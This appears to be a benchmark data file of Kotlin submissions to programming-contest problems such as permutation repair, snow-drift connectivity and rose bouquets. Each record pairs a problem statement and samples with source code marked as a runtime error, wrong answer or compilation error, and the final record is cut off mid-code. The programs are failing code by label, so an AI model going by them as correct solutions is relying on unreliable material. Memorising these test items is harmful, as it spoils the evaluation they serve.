{"difficulty":1000,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_1194","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*\n\nfun main() {\n    val scanner = Scanner(System.`in`)\n    val input = scanner.nextInt()\n\n    val countList = MutableList(input) {n -> false}\n    var result = 0\n\n    repeat(input) {\n        val nextNum = scanner.nextInt()\n\n        if (countList[nextNum - 1]) {\n            result++\n        } else {\n            countList[nextNum - 1] = true\n        }\n    }\n\n    println(result)\n}","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_961","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main() {\n    val r = System.`in`.bufferedReader()\n    val s = StringBuilder()\n    val n = r.readLine()!!.toInt()\n    var drift = MutableList(n) {\n        val (a, b) = r.readLine()!!.split(\" \").map { it.toInt() }\n        Pair(a, b)\n    }\n    var ans = 0\n    while (drift.isNotEmpty()) {\n        ans++\n        val (x, y) = drift.removeAt(0)\n        val i = drift.indexOfFirst { it.first == x || it.second == y }\n        val cadidate = mutableListOf<Pair<Int, Int>>()\n        var nodDone = false\n        if (i != -1) {\n            cadidate += drift.removeAt(i)\n            nodDone = true\n        }\n        while (nodDone) {\n            nodDone = false\n            for ((x1, y1) in cadidate) {\n                val ind = drift.indexOfFirst { it.first == x1 || it.second == y1 }\n                if (ind != -1) {\n                    nodDone = true\n                    cadidate += drift.removeAt(ind)\n                    break\n                }\n            }\n        }\n    }\n    println(ans - 1)\n}","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":800,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"d54201591f7284da5e9ce18984439f4e","submission_id":"86ffd7957b33f0b3deb12890839497b1","tags":["implementation","*special","greedy","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"fun main() {\n    val x = getInputInt()\n    val y = getInputInt()\n    val z = getInputInt()\n\n    val a = getInputInt()\n    val b = getInputInt()\n    val c = getInputInt()\n\n    val grapesMap = mutableMapOf(\n        \"green\" to a,\n        \"purple\" to b,\n        \"black\" to c\n    )\n\n    provideAndrew(grapesMap, x)\n    provideDmitri(grapesMap, y)\n    provideMichal(grapesMap, z)\n    if (isValidDistribution(grapesMap)) println(\"YES\")\n    else println(\"NO\")\n}\n\nprivate fun getInputString() = readLine()!!\nprivate fun getInputInt() = getInputString().toInt()\n\nprivate fun provideAndrew(grapesMap: MutableMap<String, Int>, wanted: Int) {\n    grapesMap[\"green\"] = grapesMap[\"green\"]!!.minus(wanted)\n}\n\nprivate fun provideDmitri(grapesMap: MutableMap<String, Int>, wanted: Int) {\n    val purple = grapesMap[\"purple\"]!!\n    if(wanted <= purple) {\n        grapesMap[\"purple\"] = purple.minus(wanted)\n        return\n    }\n    grapesMap[\"purple\"] = 0\n    grapesMap[\"green\"] = grapesMap[\"green\"]!!.minus(wanted - purple)\n}\n\nprivate fun provideMichal(grapesMap: MutableMap<String, Int>, wanted: Int) {\n    grapesMap[\"black\"] = grapesMap[\"black\"]!!.minus(wanted)\n}\n\nprivate fun isValidDistribution(grapesMap: MutableMap<String, Int>) =\n    grapesMap.filter { it.value >= 0 }.size == grapesMap.size","description":"The Duck songFor simplicity, we'll assume that there are only three types of grapes: green grapes, purple grapes and black grapes.Andrew, Dmitry and Michal are all grapes' lovers, however their preferences of grapes are different. To make all of them happy, the following should happen: Andrew, Dmitry and Michal should eat at least $$$x$$$, $$$y$$$ and $$$z$$$ grapes, respectively. Andrew has an extreme affinity for green grapes, thus he will eat green grapes and green grapes only. On the other hand, Dmitry is not a fan of black grapes\u00a0\u2014 any types of grapes except black would do for him. In other words, Dmitry can eat green and purple grapes. Michal has a common taste\u00a0\u2014 he enjoys grapes in general and will be pleased with any types of grapes, as long as the quantity is sufficient.Knowing that his friends are so fond of grapes, Aki decided to host a grape party with them. He has prepared a box with $$$a$$$ green grapes, $$$b$$$ purple grapes and $$$c$$$ black grapes.However, Aki isn't sure if the box he prepared contains enough grapes to make everyone happy. Can you please find out whether it's possible to distribute grapes so that everyone is happy or Aki has to buy some more grapes?It is not required to distribute all the grapes, so it's possible that some of them will remain unused.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers $$$x$$$, $$$y$$$ and $$$z$$$ ($$$1 \\le x, y, z \\le 10^5$$$)\u00a0\u2014 the number of grapes Andrew, Dmitry and Michal want to eat. The second line contains three integers $$$a$$$, $$$b$$$, $$$c$$$ ($$$1 \\le a, b, c \\le 10^5$$$)\u00a0\u2014 the number of green, purple and black grapes in the box.","output_spec":"If there is a grape distribution that allows everyone to be happy, print \"YES\", otherwise print \"NO\".","notes":"NoteIn the first example, there is only one possible distribution:Andrew should take $$$1$$$ green grape, Dmitry should take $$$3$$$ remaining green grapes and $$$3$$$ purple grapes, and Michal will take $$$2$$$ out of $$$3$$$ available black grapes.In the second test, there is no possible distribution, since Andrew is not be able to eat enough green grapes. :(","sample_inputs":["1 6 2\n4 3 3","5 1 1\n4 3 2"],"sample_outputs":["YES","NO"]}
{"difficulty":2200,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"104cf5253e027929f257364b3874c38b","submission_id":"75fea853d5fcd5148251571900f9fc4f","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.lang.Long.max\nimport java.util.*\nimport kotlin.collections.ArrayList\n\nfun main(args: Array<String>) {\n    val scanner = Scanner(System.`in`)\n    val n = scanner.nextInt()\n    val k = scanner.nextInt()\n    val arr = ArrayList<Int>()\n    for (i in 0..n - 1) {\n        arr.add(scanner.nextInt())\n    }\n\n    val w = ArrayList<Int>()\n    val o = ArrayList<Int>()\n    val r = ArrayList<Int>()\n\n    scanner.nextLine()\n    val st = scanner.nextLine()\n\n    for (i in 0..n - 1) {\n        if (st.get(i) == 'W') {\n            w.add(arr.get(i))\n        }\n        if (st.get(i) == 'O') {\n            o.add(arr.get(i))\n        }\n        if (st.get(i) == 'R') {\n            r.add(arr.get(i))\n        }\n    }\n\n    Collections.sort(w, Collections.reverseOrder())\n    Collections.sort(o, Collections.reverseOrder())\n    Collections.sort(r, Collections.reverseOrder())\n\n    var fl1 = false\n    var fl2 = false\n\n    var sum1: Long = 0L\n    var sum2: Long = 0L\n\n    var pos1 = 0\n    var pos2 = 0\n\n    if (o.size + w.size < k && o.size + r.size < k) {\n        println(-1)\n        return\n    }\n\n    if (o.size + w.size >= k) {\n        while (pos1 + pos2 != k - 1) {\n            if (pos1 == w.size || pos2 < o.size && w.get(pos1) < o.get(pos2)) {\n                sum1 += o.get(pos2)\n                pos2 += 1\n                fl2 = true\n            } else {\n                sum1 += w.get(pos1)\n                pos1 += 1\n                fl1 = true\n            }\n        }\n\n        if (fl1 && fl2) {\n            if (pos2 == o.size || pos1 < w.size && w.get(pos1) >= o.get(pos2)) {\n                sum1 += w.get(pos1)\n            } else {\n                sum1 += o.get(pos2)\n            }\n        } else if (pos2 != o.size && fl1) {\n            sum1 += o.get(pos2)\n            fl2 = true\n        } else {\n            sum1 += w.get(pos1)\n            fl1 = true\n        }\n    }\n    if (!fl1 || !fl2) {\n            sum1 = -1\n            }\n\n    pos1 = 0\n    pos2 = 0\n    fl1 = false\n    fl2 = false\n    if (o.size + r.size >= k) {\n        while (pos1 + pos2 != k - 1) {\n            if (pos1 == r.size || pos2 < o.size && r.get(pos1) < o.get(pos2)) {\n                sum2 += o.get(pos2)\n                pos2 += 1\n                fl2 = true\n            } else {\n                sum2 += r.get(pos1)\n                pos1 += 1\n                fl1 = true\n            }\n        }\n\n        if (fl1 && fl2) {\n            if (pos2 == o.size || pos1 < r.size && r.get(pos1) >= o.get(pos2)) {\n                sum2 += r.get(pos1)\n            } else {\n                sum2 += o.get(pos2)\n            }\n        } else if (pos2 != o.size && fl1) {\n            sum2 += o.get(pos2)\n            fl2 = true\n        } else {\n            sum2 += r.get(pos1)\n            fl1 = true\n        }\n    }\n    if (!fl1 || !fl2) {\n            sum2 = -1\n            }\n\n    println(max(sum1, sum2))\n}","description":"Arkady decided to buy roses for his girlfriend.A flower shop has white, orange and red roses, and the total amount of them is n. Arkady thinks that red roses are not good together with white roses, so he won't buy a bouquet containing both red and white roses. Also, Arkady won't buy a bouquet where all roses have the same color. Arkady wants to buy exactly k roses. For each rose in the shop he knows its beauty and color: the beauty of the i-th rose is bi, and its color is ci ('W' for a white rose, 'O' for an orange rose and 'R' for a red rose). Compute the maximum possible total beauty of a bouquet of k roses satisfying the constraints above or determine that it is not possible to make such a bouquet.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009k\u2009\u2264\u2009n\u2009\u2264\u2009200\u2009000) \u2014 the number of roses in the show and the number of roses Arkady wants to buy. The second line contains a sequence of integers b1,\u2009b2,\u2009...,\u2009bn (1\u2009\u2264\u2009bi\u2009\u2264\u200910\u2009000), where bi equals the beauty of the i-th rose. The third line contains a string c of length n, consisting of uppercase English letters 'W', 'O' and 'R', where ci denotes the color of the i-th rose: 'W' denotes white, 'O' \u00a0\u2014 orange, 'R' \u2014 red.","output_spec":"Print the maximum possible total beauty of a bouquet of k roses that satisfies the constraints above. If it is not possible to make a single such bouquet, print -1.","notes":"NoteIn the first example Arkady wants to buy 3 roses. He can, for example, buy both red roses (their indices are 1 and 2, and their total beauty is 7) and the only orange rose (its index is 3, its beauty is 4). This way the total beauty of the bouquet is 11. In the second example Arkady can not buy a bouquet because all roses have the same color.","sample_inputs":["5 3\n4 3 4 1 6\nRROWW","5 2\n10 20 14 20 11\nRRRRR","11 5\n5 6 3 2 3 4 7 5 4 5 6\nRWOORWORROW"],"sample_outputs":["11","-1","28"]}
{"difficulty":1800,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"1b17a7b3b41077843ee1d6e0607720d6","submission_id":"3f0bc4993f5bcf439ea9e8e50defdd61","tags":["*special","brute force"],"exec_outcome":"COMPILATION_ERROR","source_code":"\n\nfun main() {\n    val n = readLine()!!\n    println(oneBasedArithmetic(n, 0))\n}\n\nfun oneBasedArithmetic(string: String, count: Int): Int {\n    val length = if (string[0] == '-') string.length - 1 else string.length\n    val count1 = withNOnes(string, count, length)\n    val count2 = withNPlus1Ones(string, count)\n    return if (count1 < count2) count1 else count2\n}\n\nfun withNOnes(string: String, count: Int, length: Int): Int {\n    val n = if (string[0] == '-') string.length - 1 else string.length\n    val num = string.toLong()\n    val nOnes = \"1\".repeat(n).toLong()\n    return when {\n\/\/        n < length -> oneBasedArithmetic(string, count)\n        n > length -> Int.MAX_VALUE\n        num == 0L -> count\n        num == -1L -> count + 1\n        num == 1L -> count + 1\n        num < 0L -> {\n            val rem = (num % nOnes).toString()\n            val quotient = num \/ nOnes\n            if (quotient == 0L && rem.length == n+1){\n                withNOnes((num + nOnes).toString(), count + n, n)\n            }else\n            oneBasedArithmetic(rem, count + (n * quotient.unaryMinus()).toInt())\n        }\n        else -> {\n            val rem = (num % nOnes).toString()\n            val quotient = num \/ nOnes\n            if (quotient == 0L && rem.length == n){\n                withNOnes((num - nOnes).toString(), count + n, n)\n            }else\n            oneBasedArithmetic(rem, count + (n * quotient).toInt())\n        }\n    }\n}\n\n\nfun withNPlus1Ones(string: String, count: Int): Int {\n    val n = if (string[0] == '-') string.length - 1 else string.length\n    val num = string.toLong()\n    val nOnes = \"1\".repeat(n + 1).toLong()\n    return when {\n        num < 0L -> withNOnes((num + nOnes).toString(), count + n + 1, n)\n        else -> withNOnes((nOnes - num).toString(), count + n + 1, n)\n    }\n}","description":"Prof. Vasechkin wants to represent positive integer n as a sum of addends, where each addends is an integer number containing only 1s. For example, he can represent 121 as 121=111+11+\u20131. Help him to find the least number of digits 1 in such sum.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains integer n (1\u2009\u2264\u2009n\u2009&lt;\u20091015).","output_spec":"Print expected minimal number of digits 1.","notes":null,"sample_inputs":["121"],"sample_outputs":["6"]}
{"difficulty":2100,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"3979abbe7bad0f3b5cab15c1cba19f6b","submission_id":"42f4c57781dcb7782d9004ae8ab3b3d0","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"\/**\n * Created by yakutovd on 17.03.2018.\n *\/\n\nimport java.io.BufferedReader\nimport java.io.IOException\nimport java.io.InputStreamReader\nimport java.io.PrintWriter\nimport java.util.StringTokenizer\nimport java.util.TreeSet\n\n\/**\n * Created by yakutovd on 17.03.2018.\n *\/\nfun main(args: Array<String>) {\n    try {\n        val out = PrintWriter(System.out)\n        val br = BufferedReader(InputStreamReader(System.`in`))\n        val n = Integer.parseInt(br.readLine())\n        val set = TreeSet<Pair>()\n\n        for (i in 0..(n - 1)) {\n            val st = StringTokenizer(br.readLine())\n            val l = Integer.parseInt(st.nextToken())\n            val r = Integer.parseInt(st.nextToken())\n            val pair = Pair(l, r)\n            var L = l\n            var R = r\n            while (true) {\n                val toRight = set.ceiling(pair)\n                if (toRight != null && toRight.l <= r) {\n                    R = Math.max(R, toRight.r)\n                    set.remove(toRight)\n                } else {\n                    break\n                }\n            }\n            while (true) {\n                val toLeft = set.floor(pair)\n                if (toLeft != null && toLeft.r >= l) {\n                    L = Math.min(L, toLeft.l)\n                    set.remove(toLeft)\n                } else {\n                    break\n                }\n            }\n            set.add(Pair(L, R))\n            out.print(set.size.toString() + \" \")\n        }\n        out.println()\n        out.close()\n    } catch (ex : IOException) {\n    }\n}\n\nclass Pair(internal var l: Int, internal var r: Int) : Comparable<Pair> {\n\n\n    override fun compareTo(o: Pair): Int {\n        return if (l != o.l) {\n            Integer.compare(l, o.l)\n        } else Integer.compare(r, o.r)\n    }\n}\n","description":"There is a straight line colored in white. n black segments are added on it one by one.After each segment is added, determine the number of connected components of black segments (i.\u00a0e. the number of black segments in the union of the black segments). In particular, if one segment ends in a point x, and another segment starts in the point x, these two segments belong to the same connected component.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009200\u2009000) \u2014 the number of segments. The i-th of the next n lines contains two integers li and ri (1\u2009\u2264\u2009li\u2009&lt;\u2009ri\u2009\u2264\u2009109) \u2014 the coordinates of the left and the right ends of the i-th segment. The segments are listed in the order they are added on the white line.","output_spec":"Print n integers \u2014 the number of connected components of black segments after each segment is added. ","notes":"NoteIn the first example there are two components after the addition of the first two segments, because these segments do not intersect. The third added segment intersects the left segment and touches the right segment at the point 4 (these segments belong to the same component, according to the statements). Thus the number of connected components of black segments is equal to 1 after that.","sample_inputs":["3\n1 3\n4 5\n2 4","9\n10 20\n50 60\n30 40\n70 80\n90 100\n60 70\n10 40\n40 50\n80 90"],"sample_outputs":["1 2 1","1 2 3 4 5 4 3 2 1"]}
{"difficulty":2700,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"40002052843ca0357dbd3158b16d59f4","submission_id":"d9e59f6ff556e971de6f8796a6421d0b","tags":["dp","greedy","graphs","number theory","math","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main() {\n\treadLn()\n\tval a = readInts().sorted()\n\tval m = a.last()\n\/\/\tval isPrime = (0..m).map { i -> (i >= 2) && (2 until i).all { j -> i % j != 0 } }\n\tval myPrimes = MutableList(m + 1) { listOf<Int>() }\n\tval factPrimes = MutableList(m + 1) { listOf<Int>() }\n\tfor (i in 2..m) {\n\t\tval j = (2..i).first { j -> i % j == 0 }\n\t\tmyPrimes[i] = myPrimes[i \/ j].plus(j)\n\t\tfactPrimes[i] = factPrimes[i - 1].plus(myPrimes[i]).sortedDescending()\n\t}\n\tvar ans = 0\n\tfor (x in a) {\n\t\tans += factPrimes[x].size\n\t}\n\tvar x = 0\n\tvar b = a;\n\twhile (true) {\n\t\tval count = mutableMapOf<Int, Int>()\n\t\tfor (v in b) {\n\t\t\tval f = factPrimes[v]\n\t\t\tif (x >= f.size) continue\n\t\t\tval p = f[x]\n\t\t\tcount[p] = count.getOrDefault(p, 0) + 1\n\t\t}\n\t\tval p = count.keys.firstOrNull { p -> count[p]!! * 2 > a.size } ?: break\n\t\tval c = count[p]!!\n\t\tans += a.size - 2 * c\n\t\tb = b.filter { v ->\n\t\t\tval f = factPrimes[v]\n\t\t\tx < f.size && f[x] == p\n\t\t}\n\t\tx++\n\t}\n\tprintln(ans)\n}\n\nprivate fun readLn() = readLine()!!\nprivate fun readInt() = readLn().toInt()\nprivate fun readStrings() = readLn().split(\" \")\nprivate fun readInts() = readStrings().map { it.toInt() }\n","description":"\u00c6sir - CHAOS \u00c6sir - V.\"Everything has been planned out. No more hidden concerns. The condition of Cytus is also perfect.The time right now...... 00:01:12......It's time.\"The emotion samples are now sufficient. After almost 3 years, it's time for Ivy to awake her bonded sister, Vanessa.The system inside A.R.C.'s Library core can be considered as an undirected graph with infinite number of processing nodes, numbered with all positive integers ($$$1, 2, 3, \\ldots$$$). The node with a number $$$x$$$ ($$$x &gt; 1$$$), is directly connected with a node with number $$$\\frac{x}{f(x)}$$$, with $$$f(x)$$$ being the lowest prime divisor of $$$x$$$.Vanessa's mind is divided into $$$n$$$ fragments. Due to more than 500 years of coma, the fragments have been scattered: the $$$i$$$-th fragment is now located at the node with a number $$$k_i!$$$ (a factorial of $$$k_i$$$).To maximize the chance of successful awakening, Ivy decides to place the samples in a node $$$P$$$, so that the total length of paths from each fragment to $$$P$$$ is smallest possible. If there are multiple fragments located at the same node, the path from that node to $$$P$$$ needs to be counted multiple times.In the world of zeros and ones, such a requirement is very simple for Ivy. Not longer than a second later, she has already figured out such a node.But for a mere human like you, is this still possible?For simplicity, please answer the minimal sum of paths' lengths from every fragment to the emotion samples' assembly node $$$P$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer $$$n$$$ ($$$1 \\le n \\le 10^6$$$)\u00a0\u2014 number of fragments of Vanessa's mind. The second line contains $$$n$$$ integers: $$$k_1, k_2, \\ldots, k_n$$$ ($$$0 \\le k_i \\le 5000$$$), denoting the nodes where fragments of Vanessa's mind are located: the $$$i$$$-th fragment is at the node with a number $$$k_i!$$$.","output_spec":"Print a single integer, denoting the minimal sum of path from every fragment to the node with the emotion samples (a.k.a. node $$$P$$$). As a reminder, if there are multiple fragments at the same node, the distance from that node to $$$P$$$ needs to be counted multiple times as well.","notes":"NoteConsidering the first $$$24$$$ nodes of the system, the node network will look as follows (the nodes $$$1!$$$, $$$2!$$$, $$$3!$$$, $$$4!$$$ are drawn bold):For the first example, Ivy will place the emotion samples at the node $$$1$$$. From here:  The distance from Vanessa's first fragment to the node $$$1$$$ is $$$1$$$.  The distance from Vanessa's second fragment to the node $$$1$$$ is $$$0$$$.  The distance from Vanessa's third fragment to the node $$$1$$$ is $$$4$$$. The total length is $$$5$$$.For the second example, the assembly node will be $$$6$$$. From here:  The distance from Vanessa's first fragment to the node $$$6$$$ is $$$0$$$.  The distance from Vanessa's second fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's third fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's fourth fragment to the node $$$6$$$ is again $$$2$$$. The total path length is $$$6$$$.","sample_inputs":["3\n2 1 4","4\n3 1 4 4","4\n3 1 4 1","5\n3 1 4 1 5"],"sample_outputs":["5","6","6","11"]}
{"difficulty":2200,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"5215112549723fea3f2c1fe0049e0b2e","submission_id":"re_510","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main(args: Array<String>) {\n    fun combinations(n: Int, k: Int): Sequence<Long> {\n        return when {\n            k < 0 || k > n -> emptySequence()\n            n == 0 -> sequenceOf(0)\n            else -> sequence {\n                yieldAll(combinations(n - 1, k).map {it.shl(1)})\n                yieldAll(combinations(n - 1, k - 1).map {it.shl(1) + 1})\n            }\n        }\n    }\n    val (n, m) = readLine()!!.split(\" \").map {it.toInt()}\n    val attempts = Array(m) {\n        val s = readLine()!!.split(\" \")\n        Pair(s[0].toLong(2), s[1].toInt())\n    }\n    val answers = combinations(n, n - attempts[0].second).map {attempts[0].first xor it}\n    println(answers.filter {ans -> attempts.filter { (it.first xor ans).toString(2).count {it == '1'} != n - it.second}.isEmpty()}\n        .toList().size\n    )\n}","description":"Vasya tries to break in a safe. He knows that a code consists of n numbers, and every number is a 0 or a 1. Vasya has made m attempts to enter the code. After each attempt the system told him in how many position stand the right numbers. It is not said in which positions the wrong numbers stand. Vasya has been so unlucky that he hasn\u2019t entered the code where would be more than 5 correct numbers. Now Vasya is completely bewildered: he thinks there\u2019s a mistake in the system and it is self-contradictory. Help Vasya \u2014 calculate how many possible code variants are left that do not contradict the previous system responses.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (6\u2009\u2264\u2009n\u2009\u2264\u200935,\u20091\u2009\u2264\u2009m\u2009\u2264\u200910) which represent the number of numbers in the code and the number of attempts made by Vasya. Then follow m lines, each containing space-separated si and ci which correspondingly indicate Vasya\u2019s attempt (a line containing n numbers which are 0 or 1) and the system\u2019s response (an integer from 0 to 5 inclusively).","output_spec":"Print the single number which indicates how many possible code variants that do not contradict the m system responses are left.","notes":null,"sample_inputs":["6 2\n000000 2\n010100 4","6 3\n000000 2\n010100 4\n111100 0","6 3\n000000 2\n010100 4\n111100 2"],"sample_outputs":["6","0","1"]}
{"difficulty":2200,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"56168b28f9ab4830b3d3c5eeb7fc0d3c","submission_id":"e136070a1b582e5bb130438fae1035b7","tags":["dp","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.lang.Math.min\nimport java.util.*\nimport kotlin.collections.ArrayList\n\n\/\/object Main {\ninternal val N = 401\ninternal var sc = Scanner(System.`in`)\ninternal var g: Array<ArrayList<Int>> = arrayOf(ArrayList(N))\ninternal var nn: Int = 0\ninternal var k: Int = 0\ninternal var u: Int = 0\ninternal var v: Int = 0\ninternal var id = Array(N) { IntArray(N) }\ninternal var dp = Array(N) { IntArray(N) }\ninternal var f = IntArray(N)\ninternal var p = Array(N) { Array(N) { IntArray(N) } }\ninternal var sz = IntArray(N)\ninternal var vis = IntArray(N)\n\n\/\/    @JvmStatic\nfun main(args: Array<String>) {\n    nn = sc.nextInt()\n    k = sc.nextInt()\n\n    for (i in 0 until N) {\n        g[i] = ArrayList()\n    }\n\n    for (i in 1 until nn) {\n        u = sc.nextInt()\n        v = sc.nextInt()\n        g[u].add(v)\n        g[v].add(u)\n        id[v][u] = i\n        id[u][v] = id[v][u]\n    }\n\n    for (i in 0 until N) {\n        for (j in 0 until N) {\n            dp[i][j] = 60\n        }\n    }\n    \/\/        Arrays.fill(dp, 60);\n    dfs(1)\n    var ans = dp[1][k]\n    var rt = 1\n    for (i in 2..nn)\n        if (dp[i][k] + 1 < ans) {\n            ans = dp[i][k] + 1\n            rt = i\n        }\n\n    println(ans)\n    if (ans != 0) {\n        Arrays.fill(vis, 0)\n        if (rt != 1)\n            println(f[rt])\n        dfs(rt, k)\n        \/\/            puts(\"\");\n    }\n}\n\ninternal fun dfs(u: Int) {\n    dp[u][1] = 0\n    vis[u] = 1\n    sz[u] = vis[u]\n    dp[u][0] = sz[u]\n    for (v in g[u])\n        if (vis[v] == 0) {\n            f[v] = id[u][v]\n            dfs(v)\n            sz[u] += sz[v]\n            for (j in sz[u] downTo 1) {\n                var tmp = 1e9.toInt()\n                for (k in 0..min(j - 1, sz[v]))\n                    if (tmp > dp[v][k] + dp[u][j - k]) {\n                        tmp = dp[v][k] + dp[u][j - k]\n                        p[u][v][j] = k\n                    }\n                dp[u][j] = tmp\n            }\n        }\n}\n\ninternal fun dfs(u: Int, k: Int) {\n    var k = k\n    for (i in g[u].size - 1 downTo 0)\n        if (id[u][g[u][i]] != f[u]) {\n            val v = g[u][i]\n            if (p[u][v][k] != 0)\n                dfs(v, p[u][v][k])\n            else\n                println(id[u][v])\n            k -= p[u][v][k]\n        }\n}\n\n","description":"Recently, Berland faces federalization requests more and more often. The proponents propose to divide the country into separate states. Moreover, they demand that there is a state which includes exactly k towns.Currently, Berland has n towns, some pairs of them are connected by bilateral roads. Berland has only n\u2009-\u20091 roads. You can reach any city from the capital, that is, the road network forms a tree.The Ministry of Roads fears that after the reform those roads that will connect the towns of different states will bring a lot of trouble.Your task is to come up with a plan to divide the country into states such that:  each state is connected, i.e. for each state it is possible to get from any town to any other using its roads (that is, the roads that connect the state towns),  there is a state that consisted of exactly k cities,  the number of roads that connect different states is minimum. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers n, k (1\u2009\u2264\u2009k\u2009\u2264\u2009n\u2009\u2264\u2009400). Then follow n\u2009-\u20091 lines, each of them describes a road in Berland. The roads are given as pairs of integers xi,\u2009yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u2009n;\u00a0xi\u2009\u2260\u2009yi) \u2014 the numbers of towns connected by the road. Assume that the towns are numbered from 1 to n.","output_spec":"The the first line print the required minimum number of \"problem\" roads t. Then print a sequence of t integers \u2014 their indices in the found division. The roads are numbered starting from 1 in the order they follow in the input. If there are multiple possible solutions, print any of them. If the solution shows that there are no \"problem\" roads at all, print a single integer 0 and either leave the second line empty or do not print it at all.","notes":null,"sample_inputs":["5 2\n1 2\n2 3\n3 4\n4 5","5 3\n1 2\n1 3\n1 4\n1 5","1 1"],"sample_outputs":["1\n2","2\n3 4","0"]}
{"difficulty":2500,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"6bd41042c6a442765cd93c73d55f6189","submission_id":"374ef9c551ca3a45b7555445a0160ba1","tags":["data structures","hashing","strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.BufferedReader\nimport java.io.InputStreamReader\nimport java.util.*\n\nconst val MOD = 1000000007L\nconst val P = 3L\n\nfun main() {\n    val jin = BufferedReader(InputStreamReader(System.`in`))\n    val n = jin.readLine().toInt()\n    val s = jin.readLine()\n    val hashes = LongArray(n + 1)\n    val sums = IntArray(n + 1)\n    for (j in 1..n) {\n        if (j >= 2 && s[j - 1] == '1' && s[j - 2] == '1') {\n            hashes[j] = hashes[j - 2]\n            sums[j] = sums[j - 2]\n        } else {\n            hashes[j] = ((P * hashes[j - 1]) + (s[j - 1] - '0').toLong()) % MOD\n            sums[j] = sums[j - 1] + 1\n        }\n    }\n    val next = IntArray(n + 1)\n    next[n] = n\n    for (j in n - 1 downTo 0) {\n        if (s[j] == '1') {\n            next[j] = next[j + 1]\n        } else {\n            next[j] = j\n        }\n    }\n    val THREE_POW = LongArray(n + 2)\n    THREE_POW[0] = 1L\n    for (j in 1..n + 1) {\n        THREE_POW[j] = (P * THREE_POW[j - 1]) % MOD\n    }\n    fun hash(x: Int, y: Int): Long {\n        val xn = next[x]\n        if (xn >= y) {\n            return when ((x + y) % 2) {\n                0 -> 0L\n                1 -> 1L\n                else -> -1L\n            }\n        } else {\n            \/\/println(\"x = $x, y = $y, xn = $xn\")\n            var res = hashes[y] - (hashes[xn] * THREE_POW[sums[y] - sums[xn]])\n            res %= MOD\n            if ((x + xn) % 2 == 1) {\n                res += THREE_POW[sums[y] - sums[xn]]\n                res %= MOD\n            }\n            res += MOD\n            res %= MOD\n            return res\n        }\n    }\n    \/*val ps = mutableListOf(Pair(0, 3), Pair(2, 5))\n    for (p in ps) {\n        val a = p.first\n        val b = p.second\n        println(\"hash($a, $b) = ${hash(a, b)}\")\n    }*\/\n    val q = jin.readLine().toInt()\n    val out = StringBuilder()\n    for (j in 1..q) {\n        val 